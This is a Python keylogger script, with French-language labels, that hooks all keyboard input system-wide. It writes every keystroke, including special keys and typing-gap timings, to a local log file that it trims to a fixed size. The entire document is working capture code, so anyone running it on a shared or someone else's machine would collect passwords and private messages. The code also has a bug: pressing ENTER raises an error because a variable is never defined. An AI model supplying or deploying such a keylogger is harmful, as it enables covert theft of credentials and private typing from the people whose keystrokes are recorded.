import keyboard
import os
import datetime

# dictionary mapping keys to their string representations
KEY_MAP = {
    "space": " [SPACE] ",
    "enter": " [ENTER] ",
    "esc": " [ESC] ",
    "ctrl": " [CTRL] ",
    "alt": " [ALT] ",
    "alt gr":"[ALT GR]",
    "tab": " [TAB] ",
    "maj": " [MAJ] ",
    "backspace": " [BACKSPACE] ",
    "verr.maj": " [VERR. MAJ] ",
    "haut": " [HAUT] ",
    "bas": " [BAS] ",
    "gauche": " [GAUCHE] ",
    "droite": " [DROITE] ",
    "pg.suiv": " [PAGE UP] ",
    "pg.prec": " [PAGE DOWN] ",
    "home": " [HOME] ",
    "end": " [END] ",
    "insert": " [INSERT] ",
    "delete": " [DELETE] ",
    "f1": " [F1] ",
    "f2": " [F2] ",
    "f3": " [F3] ",
    "f4": " [F4] ",
    "f5": " [F5] ",
    "f6": " [F6] ",
    "f7": " [F7] ",
    "f8": " [F8] ",
    "f9": " [F9] ",
    "f10": " [F10] ",
    "f11": " [F11] ",
    "f12": " [F12] ",
}

# file size limit in bytes
MAX_FILE_SIZE = 6000

# number of lines to keep in file
NUM_LINES_TO_KEEP = 1000

# function to write keyboard inputs to file
def write_keys(keys_pressed, last_time):
    with open("log.txt", "a") as f:
        if " [ENTER] " in keys_pressed:
            f.write("[ENTER] \n")
        else:
            current_time = datetime.datetime.now()
            time_diff = (current_time - last_time).total_seconds()
            if time_diff >= 0.5:
                if time_diff < 2:
                    f.write(f"[{int(time_diff * 1000)} ms] {''.join(keys_pressed)}")
                else:
                    f.write(f"[{int(time_diff)} s] {''.join(keys_pressed)}")
            else:
                f.write(''.join(keys_pressed))
        return current_time


# function to clean log file
def clean_file():
    with open("log.txt", "r+") as f:
        lines = f.readlines()
        if len(lines) > NUM_LINES_TO_KEEP:
            f.seek(0)
            f.writelines(lines[-NUM_LINES_TO_KEEP:])
            f.truncate()

# function called on each key press
def on_press(event):
    try:
        keys_pressed = []
        if event.name in KEY_MAP:
            keys_pressed.append(KEY_MAP[event.name])
        elif event.name.isprintable():
            keys_pressed.append(event.name)
        global last_time
        last_time = write_keys(keys_pressed, last_time)
        if os.path.getsize("log.txt") > MAX_FILE_SIZE:
            clean_file()
    except Exception as e:
        print(f"Error: {e}")

# function called on program exit
def on_exit():
    # write end time to file
    with open("log.txt", "a") as f:
        f.write(f"\n Arrêt du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")

# write start time to file
with open("log.txt", "a") as f:
    f.write(f"\n Lancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")

# initialize last_time
last_time = datetime.datetime.now()

# start listening for keyboard events
keyboard.on_press(on_press)
keyboard.wait()

# program exit
on_exit()
